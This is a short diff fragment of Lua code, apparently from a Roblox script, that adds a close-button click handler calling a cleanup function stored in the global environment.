+CloseScriptBtn.MouseButton1Click:Connect(function()
+	if getgenv().RCCarCleanup then
+		getgenv().RCCarCleanup()
+	end
+end)
